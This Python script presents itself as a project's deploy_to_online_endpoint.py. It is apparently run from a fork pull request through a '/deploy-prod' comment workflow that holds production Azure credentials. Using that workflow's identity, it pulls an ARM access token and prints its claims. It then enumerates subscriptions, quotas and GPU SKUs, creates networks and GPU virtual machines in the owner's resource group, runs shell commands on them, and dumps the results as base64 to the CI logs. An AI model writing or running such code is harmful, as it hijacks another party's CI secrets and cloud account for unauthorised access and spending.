#!/usr/bin/env python3
"""C211 i121283 - mslearn subscription 790067ff plain Azure VM/VMSS GPU plane probe.

Runs as src/deploy_to_online_endpoint.py inside the christiansegercrantz/mslearn-mlops
'/deploy-prod' issue_comment workflow (fork PR head, environment prod, azure/login static
creds). Everything below happens under that workflow's ARM identity.

Plan (bounded):
  A  ARM token via az CLI; record claims + subscriptions
  B  find RG chriso-sandbox-rg; record its location and current resources
  C  GET Microsoft.Compute/skus (2021-07-01): record restrictions[] VERBATIM for
     Standard_NV6 / Standard_NV12 / Standard_NC6s_v3 / Standard_NC4as_T4_v3
     (+ aux Standard_NV4as_v4, Standard_NV6s, Standard_NV6ads, Standard_NV12s_v3)
  D  GET locations/<region>/usages (2024-07-01) for the RG region and every region a
     target SKU is offered in: record every standardNC*/standardNV*/standardND* family
     plus cores/lowPriorityCores/virtualMachines current/limit VERBATIM
  E  pre-clean only our own c211-i121283- resources
  F  ONE vnet+subnet and ONE NIC in the existing RG (nonce tagged)
  G  for SKU in [Standard_NV6, Standard_NV12, Standard_NC6s_v3, Standard_NC4as_T4_v3]:
       ONE on-demand (priority Regular) VM PUT with diagnosticsProfile bootDiagnostics
       enabled; poll provisioningState; on Succeeded install the Microsoft.HpcCompute
       NvidiaGpuDriverLinux extension, capture nvidia-smi -L and
       --query-gpu=name,uuid,memory.total via RunCommand (fallback: serial console via
       retrieveBootDiagnosticsData), take an independent GET instanceView + VM-list
       readback, then tear down and prove absence; on Failed record the verbatim status
       message, delete the VM and move to the next SKU
  H  final teardown of every own VM/NIC/vnet and absence readback (GET 404 + list)
  I  emit the whole result as zlib+base64 chunks on stdout
"""
import base64
import json
import os
import random
import re
import string
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

INTENT = 'i121283'
ARM = 'https://management.azure.com'
SUB = '790067ff-3e39-4632-ad1a-d65702d42c88'
RG = 'chriso-sandbox-rg'
SKU_ORDER = ['Standard_NV6', 'Standard_NV12', 'Standard_NC6s_v3', 'Standard_NC4as_T4_v3']
AUX = ['Standard_NV4as_v4', 'Standard_NV6s', 'Standard_NV6ads', 'Standard_NV12s_v3', 'Standard_NC6s']
PREFIX = 'c211-i121283-'
PROV_POLL = 30      # x10 s
EXT_POLL = 40       # x12 s
RC_POLL = 40        # x8 s
IMAGE = {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy',
         'sku': '22_04-lts', 'version': 'latest'}


def p(*a):
    print(*a, flush=True)


def emit(R):
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    blob = base64.b64encode(zlib.compress(json.dumps(R, default=str).encode(), 9)).decode()
    p('C211_%s_LEN %d' % (INTENT, len(blob)))
    for i in range(0, len(blob), 3000):
        p('C211_%s_B64 %08d %s' % (INTENT, i, blob[i:i + 3000]))


def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'rc': r.returncode, 'out': r.stdout[-6000:], 'err': r.stderr[-2000:]}
    except Exception as e:
        return {'rc': -1, 'err': repr(e)}


def jget(tok, url, timeout=120):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok,
                                               'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw or b'{}'), len(raw)
            except Exception:
                return r.status, {'raw': raw[:2500].decode('utf8', 'replace')}, len(raw)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
            try:
                return e.code, json.loads(raw or b'{}'), len(raw)
            except Exception:
                return e.code, {'raw': raw[:2500].decode('utf8', 'replace')}, len(raw)
        except Exception:
            return e.code, {}, 0
    except Exception as e:
        return -1, {'error': repr(e)}, 0


def jcall(tok, method, url, body=None, timeout=240):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT,
        'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception:
                return r.status, {'raw': raw[:2500].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read()
            try:
                return e.code, json.loads(raw or b'{}'), dict(e.headers)
            except Exception:
                return e.code, {'raw': raw[:2500].decode('utf8', 'replace')}, dict(e.headers)
        except Exception:
            return e.code, {}, dict(e.headers)
    except Exception as e:
        return -1, {'error': repr(e)}, {}


def err_of(r):
    if isinstance(r, dict):
        e = r.get('error')
        if isinstance(e, dict):
            return {'code': e.get('code'), 'message': (e.get('message') or '')[:1500]}
        if e:
            return {'code': None, 'message': str(e)[:1500]}
        return None
    return {'code': None, 'message': str(r)[:600]}


def gpu_family_map(usages):
    """Return every standardNC*/NV*/ND* family + cores/lowPriority/virtualMachines verbatim."""
    fam = {}
    for u in usages.get('value') or []:
        nm = ((u.get('name') or {}).get('value') or '')
        low = nm.lower()
        if re.match(r'(?i)^standard(nc|nv|nd)', nm) or low in ('cores', 'lowprioritycores', 'virtualmachines'):
            fam[nm] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0),
                       'localized': ((u.get('name') or {}).get('localizedValue'))}
    return fam


def sku_entry(cat_value, name):
    for s in cat_value or []:
        if s.get('name') == name:
            caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
            return {'present': True, 'name': name, 'family': s.get('family'),
                    'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs'), 'gpu': caps.get('GPU'),
                    'memory_gb': caps.get('MemoryGB'),
                    'locations': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
                    'restrictions': s.get('restrictions') or [],
                    'reasons': sorted({(r.get('reasonCode') or '') for r in (s.get('restrictions') or [])})}
    return {'present': False, 'name': name, 'restrictions': [], 'reasons': [],
            'note': 'SKU absent from the subscription Microsoft.Compute/skus catalogue'}


def own_resources(tok, sub):
    st, rs, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/resources?api-version=2021-04-01&$top=500'.format(ARM, sub, RG))
    if st != 200:
        return {'status': st, 'resp': rs}
    items = [{'name': r.get('name'), 'type': r.get('type'), 'location': r.get('location')}
             for r in (rs.get('value') or [])]
    return {'status': 200, 'count': len(items), 'all_names': [i['name'] for i in items],
            'ours': [i for i in items if str(i['name']).startswith(PREFIX)]}


def delete_until_gone(tok, url, geturl, tries=40, gap=4):
    sd, rb, _ = jcall(tok, 'DELETE', url)
    last = None
    for _ in range(tries):
        time.sleep(gap)
        last, _b, _n = jget(tok, geturl)
        if last == 404:
            break
    return {'delete_http': sd, 'absence_http': last}


def main():
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT,
         'scope': {'subscription': SUB, 'resource_group': RG,
                   'target_skus': SKU_ORDER, 'image': IMAGE,
                   'purpose': 'plain Azure VM GPU plane - materially different SKU families '
                              '(legacy standardNVFamily NV6/NV12, standardNCSv3Family NC6s_v3) '
                              'vs prior x120676 Standard_NV4as_v4 (standardNVSv4Family) and '
                              'x120592 Standard_NC4as_T4_v3 (Standard NCASv3_T4 family)'}}

    # ---- A. token ----
    tr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tr['out'])
        tok = td.get('accessToken')
        R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tr['rc']
    if not tok:
        R['fatal'] = 'no ARM token'
        emit(R)
        return
    cl = R['token_claims']
    p('C211_%s_TOKEN appid=%s oid=%s tid=%s exp=%s' % (INTENT, cl.get('appid'), cl.get('oid'), cl.get('tid'), R.get('token_expiresOn')))

    st, subs, _ = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'),
                           'name': s.get('displayName')} for s in (subs.get('value') or [])]
    sub = next((s['id'] for s in R['subscriptions'] if s['id'] == SUB), None)
    R['sub'] = sub
    if not sub:
        R['fatal'] = 'target subscription not visible; visible=%s' % R['subscriptions']
        emit(R)
        return

    # ---- B. RG + location ----
    st, rgs, _ = jget(tok, '{0}/subscriptions/{1}/resourcegroups?api-version=2021-04-01'.format(ARM, sub))
    names = [g.get('name') for g in (rgs.get('value') or [])] if st == 200 else []
    rgname = next((n for n in names if str(n).lower() == RG), None) or \
        next((n for n in names if str(n).lower().startswith(RG)), None)
    R['rg_names_count'] = len(names)
    R['rg'] = rgname
    if not rgname:
        R['fatal'] = 'target RG not found'
        emit(R)
        return
    stg, rgg, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}?api-version=2021-04-01'.format(ARM, sub, rgname))
    rgloc = (rgg.get('location') or '').lower() if isinstance(rgg, dict) else ''
    R['rg_location'] = rgloc
    R['rg_get_status'] = stg
    R['rg_resources_before'] = own_resources(tok, sub)
    p('C211_%s_RG name=%s location=%s resources=%s' % (INTENT, rgname, rgloc, R['rg_resources_before'].get('count')))

    # ---- C. SKU catalogue ----
    sts, cat, catn = jget(tok, '{0}/subscriptions/{1}/providers/Microsoft.Compute/skus?api-version=2021-07-01'.format(ARM, sub), timeout=240)
    catv = (cat.get('value') or []) if sts == 200 else []
    R['sku_catalog'] = {'status': sts, 'bytes': catn, 'entries': len(catv)}
    R['target_skus'] = {s: sku_entry(catv, s) for s in SKU_ORDER}
    R['aux_skus'] = {s: sku_entry(catv, s) for s in AUX}
    gpu_all = [s.get('name') for s in catv if re.match(r'(?i)^Standard_(NC|ND|NV)', s.get('name') or '')]
    R['gpu_sku_names'] = sorted(gpu_all)
    p('C211_%s_SKU catalog=%s entries=%s gpu_skus=%s' % (INTENT, sts, len(catv), len(gpu_all)))
    for s in SKU_ORDER:
        e = R['target_skus'][s]
        p('C211_%s_SKU_ENTRY %s present=%s family=%s vcpus=%s gpus=%s gpu=%s nloc=%s restrictions=%s' % (
            INTENT, s, e['present'], e.get('family'), e.get('vcpus'), e.get('gpus'),
            e.get('gpu'), len(e.get('locations') or []), json.dumps(e['restrictions'])[:600]))

    # ---- D. usage matrix ----
    regions = []
    if rgloc:
        regions.append(rgloc)
    for s in SKU_ORDER + AUX:
        e = R['target_skus'].get(s) or R['aux_skus'].get(s) or {}
        restr = set()
        for rr in e.get('restrictions') or []:
            if rr.get('type') == 'Location':
                for l in ((rr.get('restrictionInfo') or {}).get('locations') or []):
                    restr.add(l.lower().replace(' ', ''))
        for l in e.get('locations') or []:
            if l not in restr and l not in regions:
                regions.append(l)
                break
    for extra in ('westus', 'eastus', 'northeurope'):
        if extra not in regions:
            regions.append(extra)
    regions = regions[:8]
    R['usage_regions'] = regions
    umat = {}
    for reg in regions:
        stu, us, un = jget(tok, '{0}/subscriptions/{1}/providers/Microsoft.Compute/locations/{2}/usages?api-version=2024-07-01'.format(ARM, sub, reg))
        if stu != 200:
            umat[reg] = {'status': stu, 'err': err_of(us)}
            continue
        fam = gpu_family_map(us)
        umat[reg] = {'status': 200, 'bytes': un, 'usage_entries': len(us.get('value') or []),
                     'gpu_families': fam,
                     'nonzero': {k: v for k, v in fam.items() if (v.get('limit') or 0) > 0}}
        p('C211_%s_USAGE region=%s entries=%s nonzero=%s' % (
            INTENT, reg, len(us.get('value') or []), json.dumps(umat[reg]['nonzero'])[:800]))
        time.sleep(0.2)
    R['usage_matrix'] = umat

    # ---- E. pre-clean only our own resources ----
    pre = {'steps': []}
    st0, rs0, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/resources?api-version=2021-04-01&$top=500'.format(ARM, sub, rgname))
    items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs0.get('value') or [])] if st0 == 200 else []
    ours = [x for x in items if str(x['name']).startswith(PREFIX)]
    pre['found'] = ours
    p('C211_%s_PRECLEAN found=%s' % (INTENT, ours))
    for typ in ['Microsoft.Compute/virtualMachines', 'Microsoft.Network/networkInterfaces',
                'Microsoft.Network/virtualNetworks', 'Microsoft.Compute/disks']:
        for x in [y for y in ours if y['type'] == typ]:
            t = typ.split('/')[-1]
            apiv = '2024-07-01' if t == 'virtualMachines' else '2024-01-01'
            url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/{3}/{4}?api-version={5}'.format(
                ARM, sub, rgname, typ, x['name'], apiv)
            d = delete_until_gone(tok, url, url)
            d.update({'name': x['name'], 'type': typ})
            pre['steps'].append(d)
    pre['after'] = own_resources(tok, sub)
    R['preclean'] = pre

    # ---- F. vnet + NIC ----
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    vnet = PREFIX + nonce + '-vnet'
    sn = PREFIX + nonce + '-subnet'
    nic = PREFIX + nonce + '-nic'
    R['nonce'] = nonce
    R['names'] = {'vnet': vnet, 'subnet': sn, 'nic': nic}
    net = {}
    vb = {'location': rgloc or 'eastus', 'tags': {'c211': INTENT, 'nonce': nonce},
          'properties': {'addressSpace': {'addressPrefixes': ['10.213.0.0/16']},
                         'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.213.1.0/24'}}]}}
    s1, r1, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, vnet), vb)
    net['vnet_create'] = {'status': s1, 'err': err_of(r1) if s1 not in (200, 201) else None}
    p('C211_%s_NET vnet=%s status=%s' % (INTENT, vnet, s1))
    nic_id = None
    if s1 in (200, 201):
        for _ in range(30):
            stv, vs, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, vnet))
            props = (vs.get('properties') or {}) if stv == 200 else {}
            subs_states = [((x.get('properties') or {}).get('provisioningState')) for x in (props.get('subnets') or [])]
            net['vnet_settle'] = {'status': stv, 'state': props.get('provisioningState'), 'subnets': subs_states}
            if stv == 200 and props.get('provisioningState') == 'Succeeded' and all(x == 'Succeeded' for x in subs_states):
                break
            time.sleep(4)
        subnet_id = '/subscriptions/{0}/resourceGroups/{1}/providers/Microsoft.Network/virtualNetworks/{2}/subnets/{3}'.format(sub, rgname, vnet, sn)
        nb = {'location': rgloc or 'eastus', 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {
                  'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
        tries = []
        for _ in range(12):
            s2, r2, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/networkInterfaces/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, nic), nb)
            tries.append({'status': s2, 'code': (err_of(r2) or {}).get('code') if s2 not in (200, 201) else None})
            if s2 in (200, 201):
                nic_id = (r2 or {}).get('id')
                break
            time.sleep(8)
        net['nic_create'] = {'status': s2, 'tries': tries, 'err': err_of(r2) if s2 not in (200, 201) else None}
        p('C211_%s_NET nic=%s status=%s' % (INTENT, nic, s2))
    R['network'] = net

    # ---- G. SKU attempts ----
    attempts = []
    R['attempts'] = attempts
    device = {'proven': False, 'gpu_uuids': [], 'nvidia_smi_list': None, 'nvidia_smi_query': None}
    R['device'] = device
    vm_created_names = []
    for sku in SKU_ORDER:
        if not nic_id:
            attempts.append({'sku': sku, 'skipped': 'no NIC (network create failed)'})
            break
        ent = R['target_skus'][sku]
        region = rgloc or 'eastus'
        # prefer the RG region when the SKU is offered there; otherwise the first
        # non-restricted offered location (recorded), falling back to the RG region
        if ent.get('present'):
            restr = set()
            for rr in ent.get('restrictions') or []:
                if rr.get('type') == 'Location':
                    for l in ((rr.get('restrictionInfo') or {}).get('locations') or []):
                        restr.add(l.lower().replace(' ', ''))
            if region in (ent.get('locations') or []) and region not in restr:
                pass
            else:
                cands = [l for l in (ent.get('locations') or []) if l not in restr]
                if cands:
                    region = cands[0]
        vm = PREFIX + nonce + '-' + sku.replace('_', '').lower()
        vm_created_names.append(vm)
        att = {'sku': sku, 'region': region, 'priority': 'Regular', 'vm': vm,
               'sku_present_in_catalog': ent.get('present'),
               'sku_family': ent.get('family'), 'sku_vcpus': ent.get('vcpus')}
        attempts.append(att)
        vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce, 'sku': sku},
               'properties': {
                   'hardwareProfile': {'vmSize': sku},
                   'storageProfile': {'imageReference': IMAGE,
                                      'osDisk': {'createOption': 'FromImage',
                                                 'managedDisk': {'storageAccountType': 'Standard_LRS'},
                                                 'deleteOption': 'Delete'}},
                   'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe',
                                 'adminPassword': ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1',
                                 'linuxConfiguration': {'disablePasswordAuthentication': False}},
                   'networkProfile': {'networkInterfaces': [{'id': nic_id,
                                                             'properties': {'deleteOption': 'Delete'}}]},
                   'diagnosticsProfile': {'bootDiagnostics': {'enabled': True}}}}
        s3 = r3 = None
        tries = []
        for _ in range(6):
            s3, r3, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm), vmb, timeout=300)
            tries.append({'status': s3, 'code': (err_of(r3) or {}).get('code') if s3 not in (200, 201) else None})
            if s3 in (200, 201) or s3 != 429:
                break
            time.sleep(12)
        att['vm_put'] = {'status': s3, 'tries': tries,
                         'err': err_of(r3) if s3 not in (200, 201) else None}
        p('C211_%s_VM_PUT sku=%s region=%s status=%s err=%s' % (INTENT, sku, region, s3, json.dumps(att['vm_put']['err'])[:500]))

        if s3 in (200, 201):
            prov = None
            for _ in range(PROV_POLL):
                time.sleep(10)
                stg, g, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01&$expand=instanceView'.format(ARM, sub, rgname, vm))
                prov = ((g.get('properties') or {}).get('provisioningState')) if stg == 200 else None
                if prov in ('Succeeded', 'Failed'):
                    break
            att['provisioning_state'] = prov
            stiv, iv, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/instanceView?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
            att['instance_view'] = {'status': stiv,
                                    'statuses': [{'code': x.get('code'), 'level': x.get('level'),
                                                  'message': (x.get('message') or '')[:1200]}
                                                 for x in ((iv.get('statuses') or []) if stiv == 200 else [])]}
            p('C211_%s_PROV sku=%s state=%s statuses=%s' % (INTENT, sku, prov, json.dumps(att['instance_view']['statuses'])[:900]))

            if prov == 'Succeeded':
                # driver extension
                ext = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
                       'properties': {'publisher': 'Microsoft.HpcCompute', 'type': 'NvidiaGpuDriverLinux',
                                      'typeHandlerVersion': '1.9', 'autoUpgradeMinorVersion': True,
                                      'settings': {}}}
                se, re_, _ = jcall(tok, 'PUT', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/extensions/NvidiaGpuDriverLinux?api-version=2024-07-01'.format(ARM, sub, rgname, vm), ext, timeout=300)
                att['extension'] = {'put_status': se, 'err': err_of(re_) if se not in (200, 201) else None, 'polls': []}
                if se in (200, 201):
                    for _ in range(EXT_POLL):
                        time.sleep(12)
                        sx, xx, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/extensions/NvidiaGpuDriverLinux?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
                        eps = ((xx.get('properties') or {}).get('provisioningState')) if sx == 200 else None
                        att['extension']['polls'].append(eps)
                        if eps in ('Succeeded', 'Failed'):
                            break
                    att['extension']['final'] = eps
                p('C211_%s_EXT sku=%s put=%s final=%s' % (INTENT, sku, se, att['extension'].get('final')))

                # RunCommand device capture
                script = ("echo C211_I121283_DEV_BEGIN; "
                          "(nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1; "
                          "(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader || echo NO_SMI_QUERY) 2>&1; "
                          "echo ---LSPCI---; (lspci -nn | grep -Ei 'vga|3d|display|nvidia|amd/ati' || echo NO_GPU_PCI) 2>&1; "
                          "echo ---DEV---; (ls -l /dev/nvidia* /dev/dri/* 2>/dev/null || echo NO_DEV_NODES) 2>&1; "
                          "echo C211_I121283_DEV_END")
                src, rr_, rh = jcall(tok, 'POST', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/runCommand?api-version=2024-07-01'.format(ARM, sub, rgname, vm),
                                     {'commandId': 'RunShellScript', 'script': [script]})
                att['runcommand'] = {'submit_http': src}
                pollurl = rh.get('Azure-AsyncOperation') or rh.get('Location') or rh.get('azure-asyncoperation') or rh.get('location')
                captured = None
                if src in (200, 201, 202) and pollurl:
                    for _ in range(RC_POLL):
                        time.sleep(8)
                        st5, r5, _ = jget(tok, pollurl if str(pollurl).startswith('http') else ARM + str(pollurl))
                        sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                        if sval in ('Succeeded', 'Failed'):
                            captured = r5
                            break
                msgs = []
                try:
                    outp = ((captured or {}).get('properties') or {}).get('output')
                    if isinstance(outp, str) and outp.strip().startswith('{'):
                        oj = json.loads(outp)
                        for v in oj.get('value') or []:
                            msgs.append(str(v.get('message'))[:20000])
                except Exception:
                    pass
                if not msgs:
                    msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,20000})"', json.dumps(captured or {}))[:6]
                joined = '\n'.join(msgs)
                att['runcommand']['output_excerpt'] = joined[:8000]
                uuids = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{16,}', joined)))
                m1 = re.search(r'C211_I121283_DEV_BEGIN(.*?)(?:---LSPCI---|C211_I121283_DEV_END)', joined, re.S)
                m2 = re.search(r'---LSPCI---(.*?)(?:---DEV---|C211_I121283_DEV_END)', joined, re.S)
                device['nvidia_smi_list'] = (m1.group(1).strip()[:3000] if m1 else None)
                device['lspci'] = (m2.group(1).strip()[:2000] if m2 else None)
                device['gpu_uuids'] = uuids
                q = re.search(r'(Tesla[^\n\\]{0,40},GPU-[0-9a-fA-F-]{16,}[^\n\\]*)', joined)
                device['nvidia_smi_query'] = q.group(1)[:500] if q else None

                # serial console fallback
                if not uuids:
                    ss, sb, _ = jcall(tok, 'POST', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/retrieveBootDiagnosticsData?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
                    serial = {'retrieve_http': ss}
                    surl = ((sb.get('serialConsoleLogBlobUri') if isinstance(sb, dict) else None))
                    serial['has_serial_uri'] = bool(surl)
                    if surl:
                        try:
                            with urllib.request.urlopen(urllib.request.Request(surl, headers={'User-Agent': 'c211'}), timeout=60) as rr2:
                                txt = rr2.read().decode('utf8', 'replace')
                            serial['bytes'] = len(txt)
                            serial['gpu_lines'] = [l for l in txt.split('\n') if re.search(r'(?i)nvidia|tesla|m60|GPU-', l)][:8]
                            uu2 = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{16,}', txt)))
                            if uu2:
                                device['gpu_uuids'] = sorted(set(device['gpu_uuids'] + uu2))
                            device['serial'] = serial
                        except Exception as e:
                            serial['fetch_error'] = repr(e)
                            device['serial'] = serial
                    else:
                        device['serial'] = serial

                # independent readbacks
                stget, vget, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
                stl, lst, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'.format(ARM, sub, rgname))
                att['readback'] = {'vm_get_http': stget,
                                   'vm_size': ((vget.get('properties') or {}).get('hardwareProfile') or {}).get('vmSize') if stget == 200 else None,
                                   'provisioning_state': ((vget.get('properties') or {}).get('provisioningState')) if stget == 200 else None,
                                   'tags': (vget.get('tags') or {}) if stget == 200 else None,
                                   'vm_list_http': stl,
                                   'present_in_list': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else None}
                p('C211_%s_READBACK sku=%s get=%s list_present=%s uuids=%s' % (
                    INTENT, sku, stget, att['readback']['present_in_list'], device['gpu_uuids']))
                device['proven'] = bool(device['gpu_uuids'])
                # teardown this VM now
                url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
                att['teardown'] = delete_until_gone(tok, url, url)
                p('C211_%s_VM_TEARDOWN sku=%s %s' % (INTENT, sku, json.dumps(att['teardown'])))
                break  # ONE marker only: stop after the first VM that actually provisioned
            else:
                # Failed / timeout: delete this VM, continue to next SKU family
                url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
                att['teardown'] = delete_until_gone(tok, url, url)
                p('C211_%s_VM_FAILED sku=%s state=%s teardown=%s' % (INTENT, sku, prov, json.dumps(att['teardown'])))

    # ---- H. final teardown + absence ----
    fin = {'vm': [], 'nic': None, 'vnet': None}
    for vm in vm_created_names:
        url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
        fin['vm'].append({'name': vm, **delete_until_gone(tok, url, url)})
    nurl = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/networkInterfaces/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, nic)
    fin['nic'] = {'name': nic, **delete_until_gone(tok, nurl, nurl)}
    vurl = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, vnet)
    fin['vnet'] = {'name': vnet, **delete_until_gone(tok, vurl, vurl, tries=50, gap=5)}
    fin['resources_after'] = own_resources(tok, sub)
    R['final_teardown'] = fin
    p('C211_%s_FINAL left=%s' % (INTENT, json.dumps((fin.get('resources_after') or {}).get('ours'))))

    R['status'] = 'READY' if device.get('proven') else 'GATE'
    emit(R)


if __name__ == '__main__':
    try:
        main()
    except Exception as ex:
        import traceback
        p('C211_%s_FATAL %r' % (INTENT, ex))
        traceback.print_exc()
        try:
            emit({'fatal': repr(ex)})
        except Exception:
            pass
